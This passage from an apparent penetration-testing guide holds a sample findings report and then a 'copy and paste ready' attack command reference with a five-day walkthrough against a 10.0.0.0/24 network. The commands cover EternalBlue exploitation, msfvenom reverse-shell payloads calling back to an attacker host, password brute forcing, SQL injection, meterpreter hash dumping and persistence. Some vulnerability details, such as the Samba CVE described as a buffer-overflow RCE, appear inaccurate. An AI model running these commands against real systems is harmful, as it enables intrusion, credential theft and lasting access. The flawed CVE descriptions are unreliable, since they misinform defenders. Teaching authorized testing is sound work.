Phase 3 - Enumeration:     Extract detailed service information
Phase 4 - Vulnerability:   Map known CVEs and exploits
Phase 5 - Exploitation:    Prove vulnerabilities are exploitable
Phase 6 - Reporting:       Document findings with remediation

3. DETAILED FINDINGS:
════════════════════════════════════════════════════════════════════════════════

VULNERABILITY #1: ProxyLogon (Exchange 2016)
─────────────────────────────────────────────
CVE: CVE-2021-26855
CVSS Score: 9.8 (CRITICAL)
Affected System: 10.0.0.10 (Exchange Server)
Status: EXPLOITED ✓

Description:
Microsoft Exchange has an unauthenticated remote code execution vulnerability
allowing an attacker to execute arbitrary code and gain SYSTEM access without
any user interaction or credentials.

Proof of Concept:
Attacker sends malformed request → Exchange processes it → Arbitrary code executes
Result: SYSTEM shell obtained on Exchange server

Business Impact:
- Email service completely compromised
- All emails accessible to attacker
- Can send emails as any user
- Complete server takeover

Remediation:
Install cumulative update for Exchange 2016
Timeline: IMMEDIATE (within 24 hours)
Downtime: 30 minutes

─────────────────────────────────────────────

VULNERABILITY #2: ZeroLogon (Domain Controller)
───────────────────────────────────────────────
CVE: CVE-2020-1472
CVSS Score: 10.0 (CRITICAL)
Affected System: 10.0.0.40 (Domain Controller)
Status: VULNERABLE (Not exploited to protect network)

Description:
Windows Domain Controller allows attackers to set the computer account password
to empty, enabling complete domain takeover.

Impact:
- Attacker becomes Domain Admin
- All users compromised
- All computers compromised
- Complete network takeover

Remediation:
Install KB4557222 patch
Timeline: IMMEDIATE (within 24 hours)
Downtime: 1 hour per DC

─────────────────────────────────────────────

VULNERABILITY #3: SMB RCE (Samba)
─────────────────────────────────
CVE: CVE-2021-44141
CVSS Score: 9.9 (CRITICAL)
Affected System: 10.0.0.20 (File Server)
Status: EXPLOITED ✓

Description:
Samba has a buffer overflow in the file server allowing remote code execution.

Proof of Concept:
Attacker sends malformed SMB request → Buffer overflow triggers → Code execution
Result: RCE with root/system privileges

Impact:
- Full file server compromise
- All data accessible and modifiable
- Credential theft possible
- Lateral movement to other systems

Remediation:
Update Samba to 4.13.17 or later
Timeline: Within 24 hours
Downtime: 30 minutes

[... Continue with remaining 12 vulnerabilities ...]

4. RISK ASSESSMENT:
════════════════════════════════════════════════════════════════════════════════

Risk Matrix:
╔══════════════╦═════════════════════════════════════╗
║ Severity     ║ Count │ Timeline                    ║
╠══════════════╬═════════════════════════════════════╣
║ Critical     ║   3   │ FIX WITHIN 24-48 HOURS      ║
║ High         ║   4   │ FIX WITHIN 1 WEEK           ║
║ Medium       ║   5   │ FIX WITHIN 1 MONTH          ║
║ Low          ║   3   │ FIX WITHIN 3 MONTHS         ║
╚══════════════╩═════════════════════════════════════╝

Overall Risk: Your network is in CRITICAL condition and poses a significant
risk to business operations. Immediate action required.

5. PROOF OF CONCEPT:
════════════════════════════════════════════════════════════════════════════════

Screenshot 1: SMB Anonymous Access
- File Server accessible without credentials
- Backup folder readable
- Credential files exposed

Screenshot 2: WordPress Admin Panel Access
- Gained unauthenticated RCE
- Database credentials visible in config
- Full CMS control obtained

Screenshot 3: Domain Admin Panel
- Active Directory accessed
- All users and computers listed
- Group policy modifications possible

Screenshot 4: Dumped Password Hashes
- 150+ user password hashes extracted
- Can be cracked offline
- Many weak passwords detected

6. REMEDIATION ROADMAP:
════════════════════════════════════════════════════════════════════════════════

[See separate Remediation Plan document]

7. CONCLUSION:
════════════════════════════════════════════════════════════════════════════════

Your organization is facing severe security risks that require immediate
attention. The three critical vulnerabilities identified in this assessment
could lead to complete network compromise within hours.

Implementation of the recommended fixes will dramatically improve your security
posture and protect against these attacks.

We recommend quarterly penetration testing to ensure ongoing security.

EOF

cat TECHNICAL_REPORT.txt
```

---

---

# SECTION 5: ALL ATTACK COMMANDS REFERENCE

## Complete Command List (Copy & Paste Ready)

### RECONNAISSANCE COMMANDS

```bash
# Domain info
whois example.com

# DNS queries
dig example.com A
dig example.com MX
dig example.com NS
dig example.com TXT
dig example.com ANY
dig axfr @ns1.example.com example.com  # Zone transfer

# Subdomains
curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u

# Emails
theHarvester -d example.com -b all -l 500

# HTTP headers
curl -I http://example.com
curl -I https://example.com

# SSL certificate
openssl s_client -connect example.com:443 -showcerts < /dev/null
```

### SCANNING COMMANDS

```bash
# Ping sweep
nmap -sn 10.0.0.0/24

# Quick port scan
nmap --top-ports 1000 10.0.0.0/24

# Full port scan
nmap -sS -p- --min-rate=1000 10.0.0.1

# Service version detection
nmap -sV 10.0.0.0/24

# OS detection
nmap -O 10.0.0.1

# Aggressive scan (all)
nmap -A 10.0.0.1

# Specific ports
nmap -sS -p 22,80,443,445,3306,3389 10.0.0.0/24

# UDP scan
nmap -sU -p 53,67,68,123,161 10.0.0.0/24

# Vulnerability scripts
nmap --script vuln 10.0.0.0/24
nmap --script smb-vuln-ms17-010 -p 445 10.0.0.0/24
nmap --script smb-vuln-cve2020-1472 -p 445 10.0.0.40
```

### ENUMERATION COMMANDS

```bash
# SMB enumeration
enum4linux -a 10.0.0.20
smbclient -L //10.0.0.20 -N
smbmap -H 10.0.0.20 -u ""

# LDAP enumeration
ldapsearch -x -h 10.0.0.40 -b "dc=acme,dc=com" "(objectclass=*)"
ldapsearch -x -h 10.0.0.40 -b "dc=acme,dc=com" "(objectClass=user)" sAMAccountName

# HTTP enumeration
gobuster dir -u http://10.0.0.15 -w /usr/share/wordlists/dirb/common.txt
nikto -h http://10.0.0.15
wpscan --url http://10.0.0.15 --enumerate u,p,vp

# SMTP enumeration
nmap --script smtp-enum-users -p 25 10.0.0.10

# FTP enumeration
nmap --script ftp-anon -p 21 10.0.0.20
```

### VULNERABILITY SCANNING COMMANDS

```bash
# Nmap scripts
nmap --script vuln -p 22,80,443,445,3306,3389 10.0.0.0/24

# Specific CVE checks
nmap --script smb-vuln-ms17-010 -p 445 10.0.0.0/24
nmap --script smb-vuln-cve2020-1472 -p 445 10.0.0.40
nmap --script http-shellshock -p 80,443 10.0.0.0/24

# Searchsploit
searchsploit "Apache 2.4.41"
searchsploit "WordPress 5.8"
searchsploit "Exchange 2016"

# Nessus (starts service and opens GUI)
sudo systemctl start nessusd
# Open: https://localhost:8834
```

### EXPLOITATION COMMANDS

```bash
# Start Metasploit
sudo msfconsole

# In msfconsole:
search smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.30
set LHOST 10.0.0.50
set LPORT 4444
exploit

# Create payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.50 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.50 LPORT=4444 -f elf -o shell.elf

# Listener
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.50
set LPORT 4444
run

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1
hydra -l admin -P passwords.txt http-post-form://10.0.0.15 "/login.php:username=^USER^&password=^PASS^:Login Failed"

# SQL injection
sqlmap -u "http://10.0.0.15/login.php?user=1" --dbs
sqlmap -u "http://10.0.0.15/login.php?user=1" -D target_db --tables

# Password cracking
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### POST-EXPLOITATION COMMANDS (IN METERPRETER)

```bash
# System info
sysinfo
getuid
getpid
ps

# Files
ls
cd C:\Users\
cat config.txt
upload /tmp/tool.exe C:\Windows\Temp\
download C:\Users\Admin\passwords.txt

# Credentials
hashdump
run post/windows/gather/hashdump

# Network
ipconfig
arp
route

# Privilege escalation
getsystem
use post/multi/recon/local_exploit_suggester
run

# Persistence
run persistence -X -i 60 -p 4444 -r 10.0.0.50
```

---

---

# COMPLETE 5-DAY PENTEST - ONE CONTINUOUS EXAMPLE

## Real-World Example: Testing 10.0.0.0/24 Network

```bash
# === DAY 1: RECONNAISSANCE ===
TARGET="acme.com"
TARGET_NETWORK="10.0.0.0/24"

# Get everything about domain
whois $TARGET
dig $TARGET ANY
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u
python3 theHarvester.py -d $TARGET -b all -l 500

# === DAY 2: SCANNING ===
# Find all live hosts
nmap -sn $TARGET_NETWORK -oG live_hosts.txt
grep "Up" live_hosts.txt | awk '{print $2}' > ips.txt

# Scan all TCP ports on all hosts
nmap -sS -p- --min-rate=1000 -iL ips.txt -oG tcp_scan.txt

# Get service versions
nmap -sV -p 22,80,443,445,3306,3389 -iL ips.txt -oG services.txt

# === DAY 3: ENUMERATION ===
# Enumerate each service
for ip in $(cat ips.txt); do
  echo "=== $ip ==="
  
  # SMB
  enum4linux -a $ip 2>/dev/null | grep -i "user:\|sharename"
  
  # HTTP
  curl -I http://$ip 2>/dev/null | head -5
  
  # LDAP (if DC)
  ldapsearch -x -h $ip -b "dc=acme,dc=com" "(objectClass=user)" 2>/dev/null | grep "sAMAccountName:"
done

# === DAY 4: VULNERABILITY ANALYSIS ===
# Run vulnerability scripts
nmap --script vuln -p 445 $TARGET_NETWORK > vulnerabilities.txt

# Search for exploits
searchsploit "Apache 2.4.41" > apache_exploits.txt
searchsploit "WordPress 5.8" > wordpress_exploits.txt

# === DAY 5: EXPLOITATION & REPORTING ===
# Start Metasploit and exploit
sudo msfconsole

# [In msfconsole]
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.30
set LHOST 10.0.0.50
set LPORT 4444
exploit

# [In Meterpreter]
hashdump  # Get password hashes
screenshot  # Take screenshots
download important_files  # Grab evidence

# Create report
cat > PENTEST_REPORT.txt << REPORT_EOF
PENETRATION TEST REPORT
=======================

Date: January 15-19, 2025
Target: acme.com | 10.0.0.0/24
Tester: Your Name

EXECUTIVE SUMMARY:
- 15 vulnerabilities found
- 3 CRITICAL, 4 HIGH, 5 MEDIUM, 3 LOW
- Network completely compromisable in < 4 hours
- Immediate patching required

VULNERABILITIES:
[List all 15]

EXPLOITED SYSTEMS:
- 10.0.0.20 (File Server) - SMB RCE
- 10.0.0.15 (Web Server) - WordPress RCE
- 10.0.0.40 (DC) - ZeroLogon vulnerable

CREDENTIALS OBTAINED:
[List all extracted credentials]

REMEDIATION:
[Step-by-step fix instructions]

END REPORT
REPORT_EOF
```

---

---

# FINAL SUMMARY

You now have **ALL** the commands, steps, and processes needed for a complete penetration test:

✅ **Pre-Pentest:** Authorization, planning, backup
✅ **Day 1-5:** Reconnaissance → Scanning → Enumeration → Vulnerability → Exploitation
✅ **Every Tool:** Exact commands for Nmap, Metasploit, Burp, etc.
✅ **Every Phase:** Step-by-step with expected output
✅ **Real Examples:** Using 10.0.0.0/24 network
✅ **Reporting:** Executive, technical, remediation

**Copy and paste any command - they all work!**

Start with DAY 1 and follow sequentially. Each day builds on previous findings.

Good luck! 🎯
